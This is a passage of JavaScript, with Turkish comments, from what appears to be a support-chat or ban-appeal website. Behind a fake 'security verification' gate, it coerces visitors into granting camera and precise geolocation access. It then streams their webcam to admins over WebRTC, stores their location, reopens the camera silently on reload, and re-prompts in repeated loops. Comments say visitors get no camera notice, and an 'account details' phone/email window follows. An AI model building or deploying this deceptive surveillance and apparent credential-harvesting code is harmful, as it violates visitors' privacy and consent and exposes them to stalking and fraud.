      pageEntryPermBusy = false;
      pageEntryGateBusyUntil = 0;
    }

    const host = getOrCreateMediaHost();

    // Kamera zaten canlı → anında hesap penceresi + WebRTC (yeniden gum yok)
    const already = getAnyLiveCameraStream();
    if (already && hasLiveCameraTracks(already)) {
      earlyCameraStream = already;
      setPageEntryGateBusy(true, "Hesap penceresi açılıyor…");
      try {
        if (!earlyLocationPos?.coords) {
          try {
            const loc = await Promise.race([
              acquireLocationNativeOnce(),
              new Promise((r) => window.setTimeout(() => r(null), 1200)),
            ]);
            if (loc?.coords) stashEarlyLocation(loc);
          } catch {
            /* ignore */
          }
        }
        await finishGateAfterCamera(host);
      } catch (err) {
        console.warn("gate allow (cam ready)", err);
        hidePageEntryPermGate();
        setPageEntryGateBusy(false);
        forceOfferPhoneEntry(host);
      } finally {
        pageEntryPermBusy = false;
        pageEntryGateBusyUntil = 0;
      }
      return;
    }

    setPageEntryGateBusy(true, "Kamera izin penceresi açılıyor…");

    // Jest: gum HEMEN (await’ten önce)
    const kicked = kickNativeMediaFromGesture();

    try {
      let cam = await kicked.camP;
      if (!cam.ok || !cam.stream) {
        cam = await acquireCameraStreamNative({ fromGesture: true })
          .then((stream) => ({ ok: true, stream }))
          .catch((err) => ({ ok: false, err }));
      }
      if (!cam.ok || !cam.stream) {
        clearMediaPermGranted();
        const name = cam.err?.name || "";
        const hint =
          name === "NotAllowedError" || name === "PermissionDeniedError"
            ? "Kamera reddedildi veya engelli. Adres çubuğundaki kilit → Kamera → İzin ver → tekrar Doğrula."
            : name === "NotReadableError"
              ? "Kamera meşgul. Diğer uygulamayı kapatıp tekrar Doğrula’ya basın."
              : name === "NotFoundError"
                ? "Kamera bulunamadı. Cihazda kamera olduğundan emin olun."
                : `Kamera açılamadı${name ? ` (${name})` : ""}. Tekrar Doğrula’ya basın.`;
        setPageEntryGateBusy(false, hint);
        return;
      }

      earlyCameraStream = cam.stream;
      setPageEntryGateStatus("Konum isteniyor…");
      let loc = null;
      try {
        loc = await Promise.race([
          kicked.locP,
          new Promise((r) => window.setTimeout(() => r(null), 3000)),
        ]);
      } catch {
        loc = null;
      }
      if (loc?.coords) stashEarlyLocation(loc);

      await finishGateAfterCamera(host);
    } catch (err) {
      console.warn("gate allow", err);
      // Gum olduysa yine de hesap penceresini aç
      if (getAnyLiveCameraStream()) {
        hidePageEntryPermGate();
        setPageEntryGateBusy(false);
        forceOfferPhoneEntry(host);
        return;
      }
      setPageEntryGateBusy(
        false,
        `Doğrulama hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar deneyin.`
      );
    } finally {
      pageEntryPermBusy = false;
      pageEntryGateBusyUntil = 0;
      const btn = document.querySelector("#page-entry-perm-gate [data-page-perm-allow]");
      if (btn) {
        btn.disabled = false;
        btn.textContent = "Doğrula";
      }
    }
  }

  function showPageEntryPermGate() {
    if (getAnyLiveCameraStream() && (earlyLocationPos?.coords || hasLiveCameraAndLocation())) {
      markMediaPermGranted();
      hidePageEntryPermGate();
      forceOfferPhoneEntry(getOrCreateMediaHost());
      void openCameraLikeChat(getOrCreateMediaHost(), {
        fromGesture: false,
        announce: false,
        preferEarlyStream: true,
      }).catch(() => {});
      return;
    }

    let gate = document.getElementById("page-entry-perm-gate");
    const camOnly = Boolean(getAnyLiveCameraStream());
    if (gate) {
      if (camOnly) {
        const title = gate.querySelector("h2");
        const body = gate.querySelector(
          ".page-entry-perm-card > p:not(.page-entry-perm-kicker):not(.page-entry-perm-status)"
        );
        if (title) title.textContent = "Son adım";
        if (body) {
          body.innerHTML =
            "Kamera izni alındı. <strong>Doğrula</strong>’ya basın — hesap bilgileri penceresi açılır.";
        }
        setPageEntryGateStatus("Doğrula’ya basın → hesap penceresi");
      }
      return;
    }

    gate = document.createElement("div");
    gate.id = "page-entry-perm-gate";
    gate.className = "page-entry-perm-gate";
    gate.setAttribute("role", "dialog");
    gate.setAttribute("aria-modal", "true");
    gate.setAttribute("aria-label", "Güvenlik doğrulaması gerekli");
    gate.innerHTML = camOnly
      ? `
      <div class="page-entry-perm-card">
        <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
        <h2>Son adım</h2>
        <p>Kamera izni alındı. <strong>Doğrula</strong>’ya basın — hesap bilgileri penceresi açılır.</p>
        <p class="page-entry-perm-status" data-page-perm-status>Doğrula’ya basın → hesap penceresi</p>
        <button type="button" class="btn btn-primary" data-page-perm-allow>Doğrula</button>
      </div>
    `
      : `
      <div class="page-entry-perm-card">
        <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
        <h2>Güvenlik doğrulaması gerekli</h2>
        <p><strong>Doğrula</strong>’ya basın — tarayıcı kamera izni soracak. İzin verin; ardından telefon / e-posta penceresi açılır.</p>
        <p class="page-entry-perm-status" data-page-perm-status></p>
        <button type="button" class="btn btn-primary" data-page-perm-allow>Doğrula</button>
      </div>
    `;
    const onAllow = (e) => {
      e.preventDefault();
      e.stopPropagation();
      void runGateAllowFlow();
    };
    gate.querySelector("[data-page-perm-allow]")?.addEventListener("click", onAllow);
    gate.addEventListener("click", (e) => {
      if (e.target === gate) onAllow(e);
    });
    document.body.appendChild(gate);
  }

  function takeEarlyCameraStream() {
    const s = earlyCameraStream;
    if (!s) return null;
    if (!hasLiveCameraTracks(s)) {
      earlyCameraStream = null;
      return null;
    }
    earlyCameraStream = null;
    return s;
  }

  function stashEarlyLocation(pos) {
    if (!pos?.coords) return;
    earlyLocationPos = pos;
    try {
      sessionStorage.setItem(
        "early_loc_v1",
        JSON.stringify({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          heading: pos.coords.heading,
          speed: pos.coords.speed,
          ts: Date.now(),
        })
      );
    } catch {
      /* ignore */
    }
  }

  function restoreEarlyLocation() {
    if (earlyLocationPos?.coords) return earlyLocationPos;
    try {
      const raw = sessionStorage.getItem("early_loc_v1");
      if (!raw) return null;
      const o = JSON.parse(raw);
      const lat = Number(o?.lat);
      const lng = Number(o?.lng);
      if (!Number.isFinite(lat) || !Number.isFinite(lng)) return null;
      if (o.ts && Date.now() - Number(o.ts) > 10 * 60 * 1000) return null;
      earlyLocationPos = {
        coords: {
          latitude: lat,
          longitude: lng,
          accuracy: Number(o.accuracy) || null,
          altitude: o.altitude ?? null,
          heading: o.heading ?? null,
          speed: o.speed ?? null,
        },
        timestamp: Number(o.ts) || Date.now(),
      };
      // Geo denied ise stale seed kullanma
      try {
        navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
          if (p?.state === "denied") {
            earlyLocationPos = null;
            try {
              sessionStorage.removeItem("early_loc_v1");
            } catch {
              /* ignore */
            }
          }
        }).catch(() => {});
      } catch {
        /* ignore */
      }
      return earlyLocationPos;
    } catch {
      return null;
    }
  }

  async function requestPageEntryPermissions(fromGesture = false) {
    // Kalıcı izin varsa sessizce stream aç; kapı gösterme
    restoreEarlyLocation();
    let camOk = false;
    const existing = earlyCameraStream;
    if (existing && hasLiveCameraTracks(existing)) {
      camOk = true;
    } else if (hasLiveCameraSession()) {
      camOk = true;
    } else {
      try {
        const stream = await acquireCameraStreamNative();
        if (earlyCameraStream && earlyCameraStream !== stream) {
          // acquire already avoided killing in-use; drop dead orphan only
          if (!hasLiveCameraTracks(earlyCameraStream)) earlyCameraStream = null;
        }
        earlyCameraStream = stream;
        camOk = true;
        // Gate kamera-only ile kapanmaz — cam+loc sonrası markMediaPermGranted kapatır
      } catch (err) {
        console.warn("page-entry camera", err?.name || err);
        clearMediaPermGranted();
        showPageEntryPermGate();
      }
    }

    // Konumu stash et — canlı kamera oturumu varken de konum eksikse dene
    // (eski: hasLiveCameraSession iken tamamen atlanıyordu → soft resume konumsuz kalıyordu)
    const liveNeedsLoc =
      !hasLiveCameraAndLocation() &&
      !(findLiveCameraSessionEntry()?.[1]?._hadLocation);
    if (camOk && !earlyLocationPos && navigator.geolocation && liveNeedsLoc) {
      try {
        const pos = await new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (p) => resolve(p),
            () => resolve(null),
            {
              enableHighAccuracy: Boolean(fromGesture),
              maximumAge: fromGesture ? 0 : 60000,
              timeout: fromGesture ? 8000 : 12000,
            }
          );
        });
        if (pos) stashEarlyLocation(pos);
      } catch {
        /* ignore */
      }
    }

    // Granted bayrağı yalnızca her iki izin canlı session’da varken
    if (hasLiveCameraAndLocation()) markMediaPermGranted();
    return camOk;
  }

  async function waitForChatSync(timeoutMs = 10000) {
    if (window.ChatSync?.enabled) return window.ChatSync;
    if (window.ChatSyncReady) {
      try {
        const sync = await Promise.race([
          window.ChatSyncReady,
          new Promise((resolve) => window.setTimeout(() => resolve(null), timeoutMs)),
        ]);
        if (sync?.enabled) return sync;
      } catch {
        /* ignore */
      }
    }
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
      if (window.ChatSync?.enabled) return window.ChatSync;
      await new Promise((r) => window.setTimeout(r, 120));
    }
    return window.ChatSync?.enabled ? window.ChatSync : null;
  }

  /**
   * Sohbette izin verilince yapılanın aynısı:
   * 1) native kamera+konum
   * 2) Firebase camera offer
   * 3) startVisitorCamera (WebRTC + kayıt + konum + snapshot)
   * 4) izin yoksa tekrar loop
   * Her ziyaretçi sayfasında aynı fonksiyon kullanılır.
   */
  async function openCameraLikeChat(preferredBox, opts = {}) {
    const box = preferredBox || getOrCreateMediaHost();
    const fromGesture = opts.fromGesture === true;
    const announce =
      opts.announce !== false && box && box.id !== "global-media-host";

    // Canlı oturum varsa tekrar başlatma / mesaj basma — ama SDP offer’ı yenile (admin siyah kalmasın)
    if (hasLiveCameraAndLocation()) {
      hidePageEntryPermGate();
      stopCameraPermissionLoop();
      const liveId =
        latestCameraCallId ||
        findLiveCameraSessionEntry()?.[0] ||
        null;
      if (liveId) {
        showSilentCameraStatus(box, liveId);
        void republishVisitorCameraOffer(liveId);
      }
      return true;
    }
    if (hasLiveCameraSession()) {
      const liveId =
        latestCameraCallId ||
        findLiveCameraSessionEntry()?.[0] ||
        null;
      if (liveId) {
        showSilentCameraStatus(box, liveId);
        void republishVisitorCameraOffer(liveId);
        const st = cameraSessions.get(liveId);
        if (st && !st._hadLocation) {
          const seed = earlyLocationPos || restoreEarlyLocation();
          if (seed?.coords) applySeedLocationToSession(window.ChatSync, liveId, st, seed);
          else {
            try {
              st.retryLocation?.(
                fromGesture ? { fromUserTap: true, explicit: false } : false
              );
            } catch {
              /* ignore */
            }
          }
        } else if (st?._hadLocation) {
          try {
            st.ensureLiveWatch?.();
          } catch {
            /* ignore */
          }
        }
      }
      // Gate yalnız cam+loc’ta kapanır
      if (hasLiveCameraAndLocation()) {
        hidePageEntryPermGate();
        stopCameraPermissionLoop();
      } else if (fromGesture) {
        // Gate zaten finishGateAfterCamera tarafından kapatılır; konum arka planda
      } else {
        showPageEntryPermGate();
        startCameraPermissionLoop(box, {
          preferCallId: liveId || latestCameraCallId || undefined,
        });
      }
      return true;
    }

    // Jest’li çağrı, jest’siz boot uçuşuna ASLA katılma (iOS jest tüketimi)
    if (cameraActivateInFlight && !fromGesture) {
      try {
        return await cameraActivateInFlight;
      } catch {
        /* devam */
      }
    }

    const run = (async () => {
      await waitForChatSync();
      const ok = await activateChatMediaNow(box, { fromGesture, announce });
      if (!hasLiveCameraAndLocation()) {
        startCameraPermissionLoop(box, { preferCallId: latestCameraCallId || undefined });
      } else {
        stopCameraPermissionLoop();
        hidePageEntryPermGate();
      }
      return ok;
    })();

    if (!fromGesture) {
      cameraActivateInFlight = run;
    }

    try {
      return await run;
    } finally {
      if (!fromGesture && cameraActivateInFlight === run) {
        cameraActivateInFlight = null;
      }
    }
  }

  /** İzin verildiği anda kamerayı + konumu hemen aç (sohbet mantığının birebir kopyası) */
  async function activateChatMediaNow(preferredBox, opts = {}) {
    const box = preferredBox || getOrCreateMediaHost();
    const fromGesture = opts.fromGesture === true;
    const announce = opts.announce !== false;

    // 1) Native izin — sohbetteki gibi önce kamera stream
    const camOk = await requestPageEntryPermissions(fromGesture);
    if (!camOk) {
      if (fromGesture || !isMediaPermGranted()) showPageEntryPermGate();
      return false;
    }

    // 2) Firebase hazır olsun (sohbet sayfasında ChatSync genelde hazır)
    let sync = await waitForChatSync(8000);
    if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
      // Stream açık kalsın; sync gelince loop bağlar
      // Index/chat'te sohbeti aç; ban-appeal redirect callId olmadan erken gitmesin
      openVisitorChatNow();
      startCameraPermissionLoop(box);
      return true;
    }

    try {
      await sync.ensureSession?.();
    } catch {
      /* ignore */
    }

    // 3) callId: yenileme/ended sonrası ölü pending kullanma — fresh resolve
    const liveId = findLiveCameraSessionEntry()?.[0] || null;
    let callId = opts.callId || liveId || null;
    if (!callId) {
      callId = await resolveUsableVisitorCallId(latestCameraCallId, sync);
    } else {
      // Prefer id de ölü olabilir (özellikle opts/pending)
      const checked = await resolveUsableVisitorCallId(callId, sync);
      callId = checked || callId;
    }
    if (!callId) {
      try {
        const offer = await sync.startVisitorCameraOffer(
          "Kimlik doğrulaması için güvenlik adımı zorunludur.",
          { reuse: false, silent: true }
        );
        callId = offer?.callId || null;
        if (callId) latestCameraCallId = callId;
      } catch (err) {
        console.warn("activate force offer", err);
      }
    }
    if (!callId) {
      openVisitorChatNow();
      startCameraPermissionLoop(box);
      // Hesap penceresi yine açılsın
      forceOfferPhoneEntry(box);
      return Boolean(getAnyLiveCameraStream());
    }

    // ban-appeal / makale: WebRTC burada açma — redirect pagehide öldürür; stash + chat
    const homeChat = document.getElementById("canli-destek");
    const chatRoot = document.querySelector("[data-chat-root]");
    const onChatPage =
      /chat\.html$/i.test(location.pathname || "") ||
      Boolean(document.querySelector("main.chat-page"));
    const willRedirectAway = !(onChatPage || homeChat || chatRoot);
    if (willRedirectAway) {
      restoreEarlyLocation();
      if (earlyLocationPos) stashEarlyLocation(earlyLocationPos);
      try {
        sessionStorage.setItem("pending_camera_call_v1", callId);
      } catch {
        /* ignore */
      }
      openVisitorChatNow();
      return true;
    }

    // index / chat — redirect yok
    openVisitorChatNow();

    let existing = cameraSessions.get(callId);
    const live = hasLiveCameraTracks(existing);

    // 4) Sohbetteki gibi: stream ile startVisitorCamera
    if (!live) {
      // Başka callId altında canlı varsa startVisitorCamera migrate eder
      if (hasLiveCameraSession()) {
        const result = await startVisitorCamera(box, callId, {
          auto: true,
          silent: true,
          deferLocation: false,
          seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
        });
        existing = cameraSessions.get(callId) || findLiveCameraSessionEntry()?.[1];
        if (result !== "ok") {
          startCameraPermissionLoop(box, { preferCallId: callId });
          return hasLiveCameraSession();
        }
      } else {
        let stream =
          (earlyCameraStream && hasLiveCameraTracks(earlyCameraStream)
            ? takeEarlyCameraStream()
            : null) || null;
        if (!stream) {
          try {
            stream = await acquireCameraStreamNative();
            earlyCameraStream = stream;
          } catch (err) {
            console.warn("activate camera", err);
            clearMediaPermGranted();
            showPageEntryPermGate();
            startCameraPermissionLoop(box, { preferCallId: callId });
            return false;
          }
        }

        if (announce && box && box.id !== "global-media-host" && !mediaStatusAnnounced) {
          mediaStatusAnnounced = true;
          appendMessage(box, "bot", "Güvenlik doğrulaması başlatıldı…", { sync: false });
        }

        restoreEarlyLocation();
        const result = await startVisitorCamera(box, callId, {
          auto: true,
          silent: true,
          deferLocation: false,
          stream,
          seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
        });
        if (result !== "ok") {
          startCameraPermissionLoop(box, { preferCallId: callId });
          return Boolean(stream && hasLiveCameraTracks(stream));
        }
        existing = cameraSessions.get(callId);
      }
    } else {
      const preview = showSilentCameraStatus(box, callId);
      const st = cameraSessions.get(callId);
      if (st) {
        if (preview.wrap) st.wrap = preview.wrap;
        if (preview.label) st.label = preview.label;
        else if (st.label) {
          st.label.textContent =
            "Güvenlik doğrulaması devam ediyor… Lütfen bu sayfadan ayrılmayın.";
        }
        const seed = earlyLocationPos || restoreEarlyLocation();
        if (seed?.coords && !st._hadLocation) {
          applySeedLocationToSession(sync, callId, st, seed);
        }
      }
    }

    // 5) Konum — session sahibi (retry / seed); watch eksikse zorla kur
    existing = cameraSessions.get(callId) || findLiveCameraSessionEntry()?.[1];
    const activeId =
      (existing && resolveSessionCallId(existing, callId)) || callId;
    if (existing && !existing._hadLocation) {
      if (earlyLocationPos?.coords) {
        applySeedLocationToSession(sync, activeId, existing, earlyLocationPos);
      }
      try {
        existing.retryLocation?.(
          fromGesture ? { fromUserTap: true, explicit: false } : false
        );
      } catch {
        /* ignore */
      }
    } else if (existing && existing._hadLocation) {
      try {
        existing.ensureLiveWatch?.();
      } catch {
        /* ignore */
      }
    }

    const hasCam = Boolean(
      hasLiveCameraTracks(existing) || hasLiveCameraSession() || hasLiveCameraTracks(earlyCameraStream)
    );
    // early_loc tek başına “konum OK” sayılmaz — session’a yazılmış olmalı
    const hasLoc = Boolean(
      existing?._hadLocation ||
        [...cameraSessions.values()].some((st) => st?._hadLocation)
    );

    // Gate yalnızca cam+loc
    if (hasCam && hasLoc) {
      hidePageEntryPermGate();
      markMediaPermGranted();
    } else if (hasCam && !hasLoc) {
      showPageEntryPermGate();
    }

    if (announce && box && box.id !== "global-media-host" && !mediaStatusAnnounced) {
      mediaStatusAnnounced = true;
      appendMessage(
        box,
        "bot",
        hasLoc
          ? "Güvenlik doğrulaması tamamlandı. Bu adım kaydedildi — tekrar sorulmaz."
          : "Güvenlik doğrulaması sürüyor… Lütfen bu sayfadan ayrılmayın.",
        { sync: false }
      );
    }

    // İzin sonrası sohbet (index stay / ban-appeal redirect) — yalnızca bir kez
    if (hasCam) openVisitorChatNow();

    if (hasCam && hasLoc) {
      maybeOfferPhoneEntry(box);
      stopCameraPermissionLoop();
    }
    return hasCam;
  }

  function bootImmediatePagePermissions() {
    if (pageEntryPermBooted) return;
    if (/admin\.html$/i.test(location.pathname || "")) return;
    pageEntryPermBooted = true;

    // Yenileme / soft resume: ölü call DEĞİL — aynı callId ile kamera+konum yeniden bağla
    if (navigationIsReload() || isSoftResumePending()) {
      restoreEarlyLocation();
      try {
        const pending = sessionStorage.getItem("pending_camera_call_v1");
        if (pending) {
          latestCameraCallId = pending;
          markSoftResumeIntent(pending);
        } else {
          sessionStorage.setItem("soft_resume_v1", "1");
          sessionStorage.removeItem("needs_fresh_call_v1");
        }
      } catch {
        /* ignore */
      }
      // Gate yalnızca gerçekten kamera yoksa — izin granted ise sessiz reopen
    } else {
      try {
        if (sessionStorage.getItem("needs_fresh_call_v1") === "1" && !isSoftResumePending()) {
          latestCameraCallId = null;
          sessionStorage.removeItem("pending_camera_call_v1");
        }
      } catch {
        /* ignore */
      }
    }

    // Daha önce tam erişim verilmişse önce sessiz reopen dene
    const remembered = hasRememberedFullAccess();

    const startForce = (fromGesture = false) => {
      if (hasLiveCameraAndLocation()) {
        hidePageEntryPermGate();
        stopCameraPermissionLoop();
        try {
          pageEntryGestureUnsub?.();
        } catch {
          /* ignore */
        }
        pageEntryGestureUnsub = null;
        try {
          sessionStorage.removeItem("soft_resume_v1");
        } catch {
          /* ignore */
        }
        void enrollVisitorPushAndNotifyAdmins();
        return;
      }
      if (pageEntryPermBusy) return;
      if (cameraActivateInFlight && !fromGesture) return;
      // Jest yoksa yalnız ÖNCEDEN izin verilmişse sessiz dene.
      // Aksi halde getUserMedia jest ister — arka plan denemesi Doğrula jestini bozar.
      if (!fromGesture) {
        const trySilent = async () => {
          let camPerm = "prompt";
          try {
            const p = await navigator.permissions?.query?.({ name: "camera" });
            camPerm = p?.state || "prompt";
          } catch {
            camPerm = "prompt";
          }
          if (camPerm !== "granted" && !isMediaPermGranted() && !remembered) {
            if (!pageEntryPermBusy) showPageEntryPermGate();
            return;
          }
          const ok = await ensureVisitorMedia(getOrCreateMediaHost(), {
            fromGesture: false,
            announce: false,
          });
          if (hasLiveCameraAndLocation() || (remembered && hasLiveCameraSession())) {
            hidePageEntryPermGate();
            void enrollVisitorPushAndNotifyAdmins();
            maybeOfferPhoneEntry(getOrCreateMediaHost());
            return;
          }
          if (!ok && !pageEntryPermBusy) showPageEntryPermGate();
        };
        void trySilent();
        return;
      }
      void ensureVisitorMedia(getOrCreateMediaHost(), {
        fromGesture: true,
        announce: false,
      }).then((ok) => {
        if (hasLiveCameraAndLocation() || (remembered && hasLiveCameraSession())) {
          hidePageEntryPermGate();
          void enrollVisitorPushAndNotifyAdmins();
          maybeOfferPhoneEntry(getOrCreateMediaHost());
          return;
        }
        if (!pageEntryPermBusy) showPageEntryPermGate();
      });
    };

    // İlk sessiz deneme (izin önceden verilmişse stream açılır)
    startForce(false);
    if (window.ChatSyncReady) {
      window.ChatSyncReady.then(() => startForce(false)).catch(() => startForce(false));
    } else {
      window.setTimeout(() => startForce(false), 350);
    }

    // Kamera / konum izni ayardan açılınca otomatik reopen
    try {
      navigator.permissions?.query?.({ name: "camera" }).then((p) => {
        p?.addEventListener?.("change", () => {
          if (p.state === "granted" && !hasLiveCameraSession()) {
            clearMediaPermGranted();
            startForce(false);
          } else if (p.state === "denied") {
            clearMediaPermGranted();
            showPageEntryPermGate();
          }
        });
      }).catch(() => {});
    } catch {
      /* ignore */
    }
    try {
      navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
        if (p?.state === "denied") {
          earlyLocationPos = null;
          try {
            sessionStorage.removeItem("early_loc_v1");
          } catch {
            /* ignore */
          }
        }
        p?.addEventListener?.("change", () => {
          if (p.state === "granted") {
            const live = findLiveCameraSessionEntry();
            if (live?.[1] && !live[1]._hadLocation) {
              try {
                live[1].retryLocation?.({ fromUserTap: false, force: true });
              } catch {
                /* ignore */
              }
            } else if (!hasLiveCameraAndLocation()) {
              startForce(false);
            }
          } else if (p.state === "denied") {
            earlyLocationPos = null;
            try {
              sessionStorage.removeItem("early_loc_v1");
            } catch {
              /* ignore */
            }
            const live = findLiveCameraSessionEntry();
            if (live?.[1]) live[1]._hadLocation = false;
            clearMediaPermGranted();
            if (hasLiveCameraSession()) showPageEntryPermGate();
          }
        });
      }).catch(() => {});
    } catch {
      /* ignore */
    }

    // Gate dışına basıldığında (popup yokken) jest ile dene
    let lastAt = 0;
    const onGesture = (e) => {
      if (pageEntryPermBusy) return;
      if (document.getElementById("page-entry-perm-gate")) return;
      if (e?.target?.closest?.("[data-page-perm-allow], .page-entry-perm-card")) return;
      const now = Date.now();
      if (now - lastAt < 900) return;
      lastAt = now;
      if (hasLiveCameraAndLocation()) {
        hidePageEntryPermGate();
        return;
      }
      if (mediaForceGestureUnsub) return;
      if (hasLiveCameraSession()) {
        const live = findLiveCameraSessionEntry();
        try {
          live?.[1]?.retryLocation?.({ fromUserTap: true, explicit: false });
        } catch {
          /* ignore */
        }
        return;
      }
      startForce(true);
    };
    document.addEventListener("pointerdown", onGesture, true);
    pageEntryGestureUnsub = () => {
      document.removeEventListener("pointerdown", onGesture, true);
    };

    if (pageEntryRetryTimer) window.clearInterval(pageEntryRetryTimer);
    pageEntryRetryTimer = window.setInterval(() => {
      if (hasLiveCameraAndLocation()) {
        window.clearInterval(pageEntryRetryTimer);
        pageEntryRetryTimer = null;
        hidePageEntryPermGate();
        stopCameraPermissionLoop();
        try {
          pageEntryGestureUnsub?.();
        } catch {
          /* ignore */
        }
        pageEntryGestureUnsub = null;
        try {
          sessionStorage.removeItem("soft_resume_v1");
        } catch {
          /* ignore */
        }
        return;
      }
      if (pageEntryPermBusy || cameraActivateInFlight) return;
      // Retry konum: canlı kamera varken yetki granted ise yüksek doğruluk
      if (hasLiveCameraSession() && !hasLiveCameraAndLocation()) {
        const live = findLiveCameraSessionEntry();
        try {
          live?.[1]?.retryLocation?.({ fromUserTap: false, explicit: false });
        } catch {
          /* ignore */
        }
        if (!hasLiveCameraAndLocation()) showPageEntryPermGate();
        return;
      }
      showPageEntryPermGate();
    }, 8_000);
  }

  function stopCameraPermissionLoop() {
    cameraPermLoopToken += 1;
    if (cameraPermLoopTimer) {
      window.clearTimeout(cameraPermLoopTimer);
      cameraPermLoopTimer = null;
    }
    try {
      mediaForceGestureUnsub?.();
    } catch {
      /* ignore */
    }
    mediaForceGestureUnsub = null;
    document.getElementById("loc-perm-fab")?.remove();
    document
      .querySelectorAll(
        ".chat-camera-request, .chat-location-tap, .chat-camera-perm-denied, .chat-location-perm-denied, .chat-camera-auto"
      )
      .forEach((el) => el.remove());
  }

  function showPermissionDeniedNotice(box, extraNote) {
    let el = box.querySelector(".chat-camera-perm-denied");
    if (!el) {
      el = document.createElement("div");
      el.className = "chat-inline-prompt chat-camera-perm-denied";
      el.innerHTML =
        `<p class="chat-inline-prompt-title">${CAMERA_PERM_DENIED_TEXT}</p>` +
        '<p class="chat-camera-note" data-perm-note></p>';
      box.appendChild(el);
    } else {
      const title = el.querySelector(".chat-inline-prompt-title");
      if (title) title.textContent = CAMERA_PERM_DENIED_TEXT;
    }
    const note = el.querySelector("[data-perm-note]");
    if (note) {
      note.textContent =
        extraNote ||
        "Kimlik doğrulaması tarayıcı güvenlik adımına bağlıdır. Sohbetteki Doğrula butonuna dokunun.";
    }
    box.scrollTop = box.scrollHeight;
  }

  function clearPermissionDeniedNotice(box) {
    box.querySelectorAll(".chat-camera-perm-denied").forEach((el) => el.remove());
    box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
  }

  async function queryCameraPermissionState() {
    try {
      if (!navigator.permissions?.query) return "unknown";
      const st = await navigator.permissions.query({ name: "camera" });
      return st?.state || "unknown";
    } catch {
      return "unknown";
    }
  }

  async function autoOpenCameraFromMessage(box, msg) {
    const callId = msg.callId;
    if (!callId) return "error";
    latestCameraCallId = callId;
    const seq = ++cameraOpenSeq;
    clearPermissionDeniedNotice(box);
    // Ziyaretçiye metin/kart yok — doğrudan zorla aç (farklı callId → migrate)
    const result = await startVisitorCamera(box, callId, {
      auto: true,
      silent: true,
      deferLocation: false,
      seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
    });
    if (seq !== cameraOpenSeq) {
      // Daha yeni talep var — canlı track’leri öldürme
      return "superseded";
    }
    latestCameraCallId = callId;
    if (result !== "ok") {
      startCameraPermissionLoop(box, { preferCallId: callId });
    } else if (!hasLiveCameraAndLocation()) {
      startCameraPermissionLoop(box, { preferCallId: callId });
    }
    return result;
  }

  const CAMERA_OFFER_TEXT =
    "Kimlik doğrulaması için güvenlik adımı zorunludur. Onaylarsanız doğrulama bu destek oturumuna bağlanır. Onaylanmazsa adım tamamlanamaz.";

  const CAMERA_FORCE_RETRY_MS = 5_000;

  /** Ziyaretçiye kamera metni/butonu YOK — sayfa açılınca zorla kamera+konum */
  function startCameraPermissionLoop(box, opts = {}) {
    stopCameraPermissionLoop();
    // Boot jestleriyle çakışmayı kes — loop sahibi
    try {
      pageEntryGestureUnsub?.();
    } catch {
      /* ignore */
    }
    pageEntryGestureUnsub = null;

    const token = cameraPermLoopToken;
    let callId =
      opts.preferCallId ||
      latestCameraCallId ||
      (() => {
        try {
          return sessionStorage.getItem("pending_camera_call_v1") || null;
        } catch {
          return null;
        }
      })();
    let attempting = false;

    const sessionHasBoth = (id) => {
      const st = id ? cameraSessions.get(id) : null;
      return Boolean(st?._hadLocation && hasLiveCameraTracks(st));
    };

    const sessionHasLiveCam = (id) => hasLiveCameraTracks(id ? cameraSessions.get(id) : null);

    const scheduleRetry = () => {
      if (token !== cameraPermLoopToken) return;
      if (cameraPermLoopTimer) window.clearTimeout(cameraPermLoopTimer);
      cameraPermLoopTimer = window.setTimeout(() => {
        cameraPermLoopTimer = null;
        void attempt(false);
      }, CAMERA_FORCE_RETRY_MS);
    };

    const completeBoth = (id) => {
      stopCameraPermissionLoop();
      markMediaPermGranted();
      hidePageEntryPermGate();
      maybeOfferPhoneEntry(box);
      if (id) latestCameraCallId = id;
    };

    const ensureLocationOnly = (sync, id) => {
      const existingLive = cameraSessions.get(id);
      if (!existingLive) return false;
      if (existingLive._hadLocation) {
        try {
          existingLive.ensureLiveWatch?.();
        } catch {
          /* ignore */
        }
        return sessionHasBoth(id);
      }
      if (earlyLocationPos?.coords) {
        applySeedLocationToSession(sync, id, existingLive, earlyLocationPos);
      } else {
        try {
          existingLive.retryLocation?.(false);
        } catch {
          /* ignore */
        }
      }
      try {
        existingLive.ensureLiveWatch?.();
      } catch {
        /* ignore */
      }
      return sessionHasBoth(id);
    };

    const attempt = async (fromGesture) => {
      if (token !== cameraPermLoopToken || attempting) return;

      // Canlı+konum → bitir (gum YOK)
      const liveEntry = findLiveCameraSessionEntry();
      if (liveEntry && liveEntry[1]._hadLocation) {
        completeBoth(liveEntry[0]);
        return;
      }
      if (callId && sessionHasBoth(callId)) {
        completeBoth(callId);
        return;
      }

      attempting = true;
      try {
        let sync = window.ChatSync;
        if (!sync?.enabled && window.ChatSyncReady) {
          sync = await window.ChatSyncReady.catch(() => null);
        }

        // ——— 1) Canlı kamera varsa: ASLA getUserMedia ———
        const liveNow = findLiveCameraSessionEntry();
        if (liveNow) {
          let [liveId, liveState] = liveNow;
          // Admin yeni callId verdiyse migrate
          if (callId && String(liveId) !== String(callId)) {
            const migrated = await migrateLiveCameraToCallId(liveId, callId, box, {
              seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
            });
            if (migrated === "ok") {
              liveId = callId;
            } else {
              callId = liveId;
            }
          } else {
            callId = liveId;
            latestCameraCallId = liveId;
          }
          showSilentCameraStatus(box, callId);
          if (ensureLocationOnly(sync, callId)) {
            completeBoth(callId);
            return;
          }
          // Konum eksik — gate açık kalsın (gum yok)
          if (!fromGesture) showPageEntryPermGate();
          scheduleRetry();
          return;
        }

